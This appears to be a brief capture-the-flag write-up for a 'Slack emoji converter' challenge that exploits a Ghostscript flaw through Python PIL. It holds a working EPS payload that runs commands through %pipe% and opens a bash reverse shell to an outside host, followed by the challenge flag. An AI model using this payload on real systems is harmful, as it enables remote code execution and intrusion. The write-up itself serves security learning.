# Slack emoji converter 

There is a GhostScript Vulnerbility, because using Python PIL library.

POC is :

```
%!PS
userdict /setpagedevice undef
save
legal
{ null restore } stopped { pop } if
{ legal } stopped { pop } if
restore
mark /OutputFile (%pipe%id) currentdevice putdeviceprops
```

But this POC failed, because it can't parse the image size.

So we need to add `BoundingBox`.

Final POC (reverse shell):

```
%!PS-Adobe-3.0 EPSF-3.0
%%BoundingBox: -0 -0 100 100
userdict /setpagedevice undef
save
legal
{ null restore } stopped { pop } if
{ legal } stopped { pop } if
restore
mark /OutputFile (%pipe%bash -c 'bash -i >& /dev/tcp/kaibro.tw/10001 0>&1') currentdevice putdeviceprops
```


`TWCTF{watch_0ut_gh0stscr1pt_everywhere}`
